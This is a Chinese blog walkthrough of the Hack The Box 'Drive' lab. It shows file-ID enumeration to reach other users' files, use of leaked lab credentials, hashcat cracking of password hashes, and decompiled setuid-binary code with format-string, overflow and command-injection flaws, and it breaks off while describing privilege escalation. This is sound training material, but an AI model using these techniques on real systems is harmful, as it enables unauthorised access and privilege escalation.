<!DOCTYPE html><html lang="zh-CN" id="theme-light-mode"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="zIxyd"><title>Drive(HTB) · zIxyd's Blog</title><meta name="description" content="信息搜集nmap12345678910111213141516nmap -sC -sV 10.10.11.235Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-15 14:49 CSTNmap scan report for drive.htb "><meta name="keywords" content="Blog,博客,Hexo"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="shortcut icon" type="image/x-icon" href="/images/logo.png"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="stylesheet" href="/css/insight.css"><link rel="stylesheet" href="/css/search.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"><script src="/js/jquery.js"></script><meta name="generator" content="Hexo 6.3.0"></head><body><div class="page-top animated fadeInDown"><div class="nav"><li> <a href="/">Home</a></li><li> <a href="/archives">Archives</a></li><li> <a href="/tags">Tags</a></li><li> <a href="/about">About</a></li></div><div class="information"><div class="nav_right_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)"> </a></li><li><a class="fa fa-search" onclick="openWindow();"></a></li><li><a class="fa fa-sun-o" onclick="darkLightToggle();"></a></li></div><div class="avatar"></div></div></div><div class="toc-container in-page animated fadeInDown"><details class="ltr toc-toggle"><summary>Menu</summary><div class="tocmenu"><ol class="toclist"><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toclist-text">信息搜集</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#nmap"><span class="toclist-text">nmap</span></a></li></ol></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E5%AF%BB%E6%89%BE%E6%BC%8F%E6%B4%9E"><span class="toclist-text">寻找漏洞</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#User-martin"><span class="toclist-text">User_martin</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#backups"><span class="toclist-text">backups</span></a></li><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#gitea"><span class="toclist-text">gitea</span></a></li><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#%E8%A7%A3%E5%8E%8B%E6%96%87%E4%BB%B6"><span class="toclist-text">解压文件</span></a></li></ol></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#User-tom"><span class="toclist-text">User_tom</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="toclist-text">代码分析</span></a></li><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#%E6%8F%90%E6%9D%83"><span class="toclist-text">提权</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-5"><a class="toclist-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80-bof-printf"><span class="toclist-text">方法一(bof+printf)</span></a></li><li class="toclist-item toclist-level-5"><a class="toclist-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C-load-extension"><span class="toclist-text">方法二(load_extension)</span></a></li></ol></li></ol></li></ol></div></details></div><div class="sidebar animated fadeInDown"><div class="sidebar-top"><div class="logo-title"><div class="title"><img src="/images/logo.png" style="width:220px;" alt="favicon"><h3 title=""><a href="/">zIxyd's Blog</a></h3><div class="description"><p>存放个人学习笔记的小窝，欢迎交流</p></div></div><ul class="social-links"><li><a target="_blank" rel="noopener" href="https://github.com/zIxyd"><i class="fa fa-github"></i></a></li><li><a href="mailto:2972914692@qq.comm"><i class="fa fa-envelope"></i></a></li><li><a target="_blank" rel="noopener" href="https://res.abeim.cn/api-qq?qq=2972914692"><i class="fa fa-qq"></i></a></li></ul></div><div class="toc-container in-sidebar"><details class="ltr" open><summary>Menu</summary><div class="tocmenu"><ol class="toclist"><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toclist-text">信息搜集</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#nmap"><span class="toclist-text">nmap</span></a></li></ol></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E5%AF%BB%E6%89%BE%E6%BC%8F%E6%B4%9E"><span class="toclist-text">寻找漏洞</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#User-martin"><span class="toclist-text">User_martin</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#backups"><span class="toclist-text">backups</span></a></li><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#gitea"><span class="toclist-text">gitea</span></a></li><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#%E8%A7%A3%E5%8E%8B%E6%96%87%E4%BB%B6"><span class="toclist-text">解压文件</span></a></li></ol></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#User-tom"><span class="toclist-text">User_tom</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="toclist-text">代码分析</span></a></li><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#%E6%8F%90%E6%9D%83"><span class="toclist-text">提权</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-5"><a class="toclist-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80-bof-printf"><span class="toclist-text">方法一(bof+printf)</span></a></li><li class="toclist-item toclist-level-5"><a class="toclist-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C-load-extension"><span class="toclist-text">方法二(load_extension)</span></a></li></ol></li></ol></li></ol></div></details></div></div><div class="footer"><div class="p"> <span> 全站CC-BY-SA-3.0 </span><i class="fa fa-star"></i><span> zIxyd</span></div><div class="by_farbox"><span>Powered by </span><a href="https://hexo.io/zh-cn/" target="_blank">Hexo </a><span> & </span><a href="https://github.com/Lhcfl/hexo-theme-anatolo" target="_blank">Anatolo </a></div><div class="beian"></div></div></div><div class="main"><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post animated fadeInDown"><div class="post-title"><h3><a>Drive(HTB)</a></h3></div><div class="post-content"><p><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><h4 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV 10.10.11.235</span><br><span class="line">Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-15 14:49 CST</span><br><span class="line">Nmap scan report for drive.htb (10.10.11.235)</span><br><span class="line">Host is up (0.18s latency).</span><br><span class="line">Not shown: 997 closed tcp ports (conn-refused)</span><br><span class="line">PORT     STATE    SERVICE VERSION</span><br><span class="line">22/tcp   open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 27:5a:9f:db:91:c3:16:e5:7d:a6:0d:6d:cb:6b:bd:4a (RSA)</span><br><span class="line">|   256 9d:07:6b:c8:47:28:0d:f2:9f:81:f2:b8:c3:a6:78:53 (ECDSA)</span><br><span class="line">|_  256 1d:30:34:9f:79:73:69:bd:f6:67:f3:34:3c:1f:f9:4e (ED25519)</span><br><span class="line">80/tcp   open     http    nginx 1.18.0 (Ubuntu)</span><br><span class="line">|_http-title: Doodle Grive</span><br><span class="line">|_http-server-header: nginx/1.18.0 (Ubuntu)</span><br><span class="line">3000/tcp filtered ppp</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>

<h3 id="寻找漏洞"><a href="#寻找漏洞" class="headerlink" title="寻找漏洞"></a>寻找漏洞</h3><p><code>http://drive.htb/</code>一个注册和登陆的功能，随意注册一个账号尝试登陆</p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20231215145359.png"></p>
<p>我们尝试上传两个文件并且查看，</p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20231215145748.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20231215145813.png"></p>
<p>注意查看的<code>url</code>一个文件似乎对应着一个ID；我们尝试从别的ID的得别的文件来泄露一些敏感文件</p>
<p>利用bp工具的<code>Intruder</code>模块来爆破；</p>
<ul>
<li>200：表示您有权访问该文件。</li>
<li>401：表示对文件的访问被拒绝，这是我们主要寻找的。</li>
<li>500：表示没有与该特定ID关联的文件。</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20231215150316.png"></p>
<p>发现ID为<code>79</code>,<code>98</code>,<code>99</code>,<code>101</code>下有文件但是我们无权查看，通过广泛的枚举，我们发现了一个潜在的攻击载体，其形式为<code>/block</code>链接。值得注意的是，此链接不会验证文件的所有者，这意味着我们可能会保留我们无法访问的文件。也就是这个漏洞导致我们可以查看到其他文件</p>
<p>在ID为79的文件下得到了敏感信息；访问<code>http://drive.htb/79/block/</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">hey team after the great success of the platform we need now to continue the work.</span><br><span class="line">on the new features for ours platform.</span><br><span class="line">I have created a user for martin on the server to make the workflow easier for you please use the password &quot;Xk4@KjyrYv8t194L!&quot;.</span><br><span class="line">please make the necessary changes to the code before the end of the month</span><br><span class="line">I will reach you soon with the token to apply your changes on the repo</span><br><span class="line">thanks! </span><br></pre></td></tr></table></figure>

<p>ssh登陆</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh martin@10.10.11.235</span><br><span class="line">password:Xk4@KjyrYv8t194L!</span><br></pre></td></tr></table></figure>

<h3 id="User-martin"><a href="#User-martin" class="headerlink" title="User_martin"></a>User_martin</h3><h4 id="backups"><a href="#backups" class="headerlink" title="backups"></a>backups</h4><p>在<code>/var/www/backups</code>目录下发现一些备份文件，下载到本地，尝试得到敏感信息；</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">martin@drive:/var/www/backups$ <span class="built_in">pwd</span></span><br><span class="line">/var/www/backups</span><br><span class="line">martin@drive:/var/www/backups$ <span class="built_in">ls</span> -l</span><br><span class="line">total 3732</span><br><span class="line">-rw-r--r-- 1 www-data www-data   13018 Sep  1 20:00 1_Dec_db_backup.sqlite3.7z</span><br><span class="line">-rw-r--r-- 1 www-data www-data   12226 Sep  1 20:00 1_Nov_db_backup.sqlite3.7z</span><br><span class="line">-rw-r--r-- 1 www-data www-data   12722 Sep  1 20:00 1_Oct_db_backup.sqlite3.7z</span><br><span class="line">-rw-r--r-- 1 www-data www-data   12770 Sep  1 20:00 1_Sep_db_backup.sqlite3.7z</span><br><span class="line">-rwxr-xr-x 1 root     root     3760128 Dec 26  2022 db.sqlite3</span><br></pre></td></tr></table></figure>

<p>下载到本地之后，会发现解压需要密码，并且db.sqlite3中并没有可以利用的信息</p>
<h4 id="gitea"><a href="#gitea" class="headerlink" title="gitea"></a>gitea</h4><p>下一步是搜索重要文件，果不其然存在一个<code>gitea</code>文件，Gitea是一个基于Go语言的开源自助Git服务，类似于GitHub或GitLab。它提供了一个轻量级的、易于安装和管理的Git服务，可以在自己的服务器上搭建私有的Git仓库。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">martin@drive:/usr/local/bin$ <span class="built_in">ls</span></span><br><span class="line">cygdb  cython  cythonize  django-admin  gitea  gunicorn  pipreqs  sqlformat</span><br><span class="line">martin@drive:/usr/local/bin$ ./gitea</span><br><span class="line">2023/12/15 07:19:00 cmd/web.go:106:runWeb() [I] Starting Gitea on PID: 665292</span><br><span class="line">2023/12/15 07:19:00 .../setting/packages.go:44:newPackages() [E] Unable to create chunked upload directory: /usr/local/bin/data/tmp/package-upload (<span class="built_in">mkdir</span> /usr/local/bin/data: permission denied)</span><br><span class="line">2023/12/15 07:19:00 ...s/install/setting.go:21:PreloadSettings() [I] AppPath: /usr/local/bin/gitea</span><br><span class="line">2023/12/15 07:19:00 ...s/install/setting.go:22:PreloadSettings() [I] AppWorkPath: /usr/local/bin</span><br><span class="line">2023/12/15 07:19:00 ...s/install/setting.go:23:PreloadSettings() [I] Custom path: /usr/local/bin/custom</span><br><span class="line">2023/12/15 07:19:00 ...s/install/setting.go:24:PreloadSettings() [I] Log path: /usr/local/bin/log</span><br><span class="line">2023/12/15 07:19:00 ...s/install/setting.go:25:PreloadSettings() [I] Configuration file: /usr/local/bin/custom/conf/app.ini</span><br><span class="line">2023/12/15 07:19:00 ...s/install/setting.go:26:PreloadSettings() [I] Prepare to run install page</span><br><span class="line">2023/12/15 07:19:01 ...s/install/setting.go:29:PreloadSettings() [I] SQLite3 is supported</span><br><span class="line">2023/12/15 07:19:02 cmd/web.go:217:listen() [I] [657bfde6] Listen: http://0.0.0.0:3000</span><br><span class="line">2023/12/15 07:19:02 cmd/web.go:221:listen() [I] [657bfde6] AppURL(ROOT_URL): http://localhost:3000/</span><br><span class="line">2023/12/15 07:19:02 ...s/graceful/server.go:61:NewServer() [I] [657bfde6] Starting new Web server: tcp:0.0.0.0:3000 </span><br></pre></td></tr></table></figure>

<p>并且<code>gitea</code>监听<code>3000</code>端口；我们尝试端口转发到本地，使得本地可以访问；</p>
<p>执行这条命令后，当你访问localhost:3000时，实际上会建立一个SSH隧道，将流量从你的本地主机的3000端口转发到drive.htb主机的3000端口。这意味着任何发送到localhost:3000的流量都会通过SSH连接被转发到drive.htb主机上运行的服务。</p>
<p>因此，如果drive.htb主机上确实有一个服务在3000端口上运行，并且SSH连接也已经建立，那么当你访问localhost:3000时，你应该能够访问到drive.htb主机上对应的服务。这种方式可以让你通过SSH连接来访问远程主机上的服务，而不需要直接暴露这些服务在公共网络上。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh martin@10.10.11.235 -L 3000:drive.htb:3000</span><br><span class="line">password:Xk4@KjyrYv8t194L!</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\24603\AppData\Roaming\Typora\typora-user-images\image-20231215153407127.png" alt="image-20231215153407127"></p>
<p>email:<code>martin@drive.htb</code>；password:<code>Xk4@KjyrYv8t194L!</code>成功登陆；只有一个仓库，在<code>DoodleGrive/db_backup.sh</code>下搜集到到了解压文件的密码：<code>H@ckThisP@ssW0rDIfY0uC@n:)</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">DB=<span class="variable">$1</span></span><br><span class="line">date_str=$(<span class="built_in">date</span> +<span class="string">&#x27;%d_%b&#x27;</span>)</span><br><span class="line">7z a -p<span class="string">&#x27;H@ckThisP@ssW0rDIfY0uC@n:)&#x27;</span> /var/www/backups/<span class="variable">$&#123;date_str&#125;</span>_db_backup.sqlite3.7z db.sqlite3</span><br><span class="line"><span class="built_in">cd</span> /var/www/backups/</span><br><span class="line"><span class="built_in">ls</span> -l --<span class="built_in">sort</span>=t *.7z &gt; backups_num.tmp</span><br><span class="line">backups_num=$(<span class="built_in">cat</span> backups_num.tmp | <span class="built_in">wc</span> -l)</span><br><span class="line"><span class="keyword">if</span> [[ <span class="variable">$backups_num</span> -gt 10 ]]; <span class="keyword">then</span></span><br><span class="line">      <span class="comment">#backups is more than 10... deleting to oldest backup</span></span><br><span class="line">      <span class="built_in">rm</span> $(<span class="built_in">ls</span>  *.7z --<span class="built_in">sort</span>=t --color=never | <span class="built_in">tail</span> -1)</span><br><span class="line">      <span class="comment">#oldest backup deleted successfully!</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">rm</span> backups_num.tmp</span><br></pre></td></tr></table></figure>

<h4 id="解压文件"><a href="#解压文件" class="headerlink" title="解压文件"></a>解压文件</h4><p><code>7z</code>解压</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">7z x 1_Nov_db_backup.sqlite3.7z -oname_Nov</span><br><span class="line">7z x 1_Oct_db_backup.sqlite3.7z -oname_Oct</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p><code>hashcat</code>破解密码，密码不止一个，枚举尝试得到了正确passwd:<code>johnmayer7</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 124 -a 0 --force -O tests  /usr/share/wordlists/rockyou.txt</span><br><span class="line"></span><br><span class="line">hashcat tests --show                                                  </span><br><span class="line">sha1$Ri2bP6RVoZD5XYGzeYWr7c<span class="variable">$71eb1093e10d8f7f4d1eb64fa604e6050f8ad141</span>:johniscool</span><br><span class="line">sha1$kyvDtANaFByRUMNSXhjvMc<span class="variable">$9e77fb56c31e7ff032f8deb1f0b5e8f42e9e3004</span>:john316</span><br><span class="line">sha1$Ri2bP6RVoZD5XYGzeYWr7c<span class="variable">$4053cb928103b6a9798b2521c4100db88969525a</span>:johnmayer7</span><br><span class="line">sha1$DhWa3Bym5bj9Ig73wYZRls<span class="variable">$3ecc0c96b090dea7dfa0684b9a1521349170fc93</span>:john boy</span><br></pre></td></tr></table></figure>

<h3 id="User-tom"><a href="#User-tom" class="headerlink" title="User_tom"></a>User_tom</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh tom@10.10.11.235</span><br><span class="line">passwd:johnmayer7</span><br></pre></td></tr></table></figure>

<h4 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000 2&gt;/dev/null</span><br><span class="line">/home/tom/doodleGrive-cli</span><br></pre></td></tr></table></figure>

<p>将文件下载到本地查看；</p>
<p>main函数存在<code>格式字符串漏洞</code>+<code>栈溢出</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// r9d</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// r9d</span></span><br><span class="line">  <span class="type">char</span> v12[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v13[<span class="number">56</span>]; <span class="comment">// [rsp+10h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v14; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v14 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setenv(<span class="string">&quot;PATH&quot;</span>, &amp;unk_4973A8, <span class="number">1LL</span>);</span><br><span class="line">  setuid(<span class="number">0LL</span>);</span><br><span class="line">  setgid(<span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[!]Caution this tool still in the development phase...please report any issue to the development team[!]&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter Username:&quot;</span>);</span><br><span class="line">  fgets(v12, <span class="number">16LL</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  sanitize_string(v12);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter password for &quot;</span>, <span class="number">16</span>, v3, v4, v5, v6, v12[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">printf</span>(v12, <span class="number">16</span>, v7, v8, v9, v10, v12[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;:&quot;</span>);</span><br><span class="line">  fgets(v13, <span class="number">400LL</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  sanitize_string(v13);</span><br><span class="line">  <span class="keyword">if</span> ( j_strcmp_ifunc(v12, <span class="string">&quot;moriarty&quot;</span>) || j_strcmp_ifunc(v13, <span class="string">&quot;findMeIfY0uC@nMr.Holmz!&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid username or password.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Welcome...!&quot;</span>);</span><br><span class="line">    main_menu();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code> main_menu()</code>函数是一些执行<strong>sqlite3</strong>的一些功能</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">	 <span class="keyword">switch</span> ( v6[<span class="number">0</span>] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">        show_users_list();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">        show_groups_list();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;3&#x27;</span>:</span><br><span class="line">        show_server_status();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;4&#x27;</span>:</span><br><span class="line">        show_server_log();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;5&#x27;</span>:</span><br><span class="line">        activate_user_account();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;6&#x27;</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;exiting...&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0LL</span>);</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;please Select a valid option...&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中<code>activate_user_account</code>函数存在sql注入</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Enter username to activate account: &quot;</span>, a2, a3, a4, a5, a6, v13[<span class="number">0</span>]);</span><br><span class="line">fgets(v13, <span class="number">40LL</span>, <span class="built_in">stdin</span>);</span><br><span class="line">v13[j_strcspn_ifunc(v13, <span class="string">&quot;\n&quot;</span>)] = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> ( v13[<span class="number">0</span>] )</span><br><span class="line">&#123;</span><br><span class="line">  sanitize_string(v13);</span><br><span class="line">  <span class="built_in">snprintf</span>(</span><br><span class="line">    v14,</span><br><span class="line">    <span class="number">250</span>,</span><br><span class="line">    <span class="string">&quot;/usr/bin/sqlite3 /var/www/DoodleGrive/db.sqlite3 -line &#x27;UPDATE accounts_customuser SET is_active=1 WHERE username=\&quot;%s\&quot;;&#x27;&quot;</span>,</span><br><span class="line">    v13,</span><br><span class="line">    v6,</span><br><span class="line">    v7,</span><br><span class="line">    v13[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Activating account for user &#x27;%s&#x27;...\n&quot;</span>, v13, v8, v9, v10, v11, v13[<span class="number">0</span>]);</span><br><span class="line">  system(v14);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Error: Username cannot be empty.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><h5 id="方法一-bof-printf"><a href="#方法一-bof-printf" class="headerlink" title="方法一(bof+printf)"></a>方法一(bof+printf)</h5><p>尝试利用二进制文件漏洞提权;</p>
<p>这道题我自己写了个exp，本地可以成功，我想去靶场机对外开一个端口服务，使我攻击机可以nc到靶场机运行这个有漏洞的二进制文件，但是我发现这个二进制文件没有刷新缓冲区原因等，导致这种办法用不了；我直接把我的exp放到靶机上，有缺少一些python的库；最终利用python的ssh技术得到远程机的一个进程提权成功</p>
